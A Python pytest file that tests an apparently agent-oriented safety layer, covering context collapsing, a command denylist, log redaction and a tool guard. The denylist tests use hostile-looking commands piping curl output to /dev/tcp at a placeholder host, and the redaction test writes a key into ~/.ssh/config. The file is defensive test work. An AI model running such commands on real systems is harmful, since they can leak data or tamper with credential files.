import pytest
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from saga_fusion.context_manager import SagaContextManager
from saga_fusion.security_policy import SagaSecurityPolicy
from saga_fusion.audit_logger import SagaAuditLogger
from saga_fusion.tool_guard import SagaToolGuard

class MockConfig:
    max_tokens = 8192

class TestContextManager:
    def test_empty_history(self):
        cm = SagaContextManager(MockConfig())
        assert cm.collapse_history([]) == []

class TestSecurityPolicy:
    def test_denylist(self):
        policy = SagaSecurityPolicy()
        decision = policy.evaluate_action({"command": "curl http://x.x.x.x > /dev/tcp"})
        assert decision.allowed == False
        assert decision.severity == "HIGH"

class TestAuditLogger:
    def test_redaction(self):
        logger = SagaAuditLogger()
        cmd = "echo 'key=12345' > ~/.ssh/config"
        redacted = logger._redact(cmd)
        assert "12345" not in redacted
        assert "[REDACTED]" in redacted

class TestToolGuard:
    def test_evaluation(self):
        policy = SagaSecurityPolicy()
        logger = SagaAuditLogger()
        guard = SagaToolGuard(policy, logger)
        actions = [{"command": "ls"}, {"command": "curl x > /dev/tcp"}]
        allowed, denied = guard.evaluate_actions(actions)
        assert len(allowed) == 1
        assert len(denied) == 1
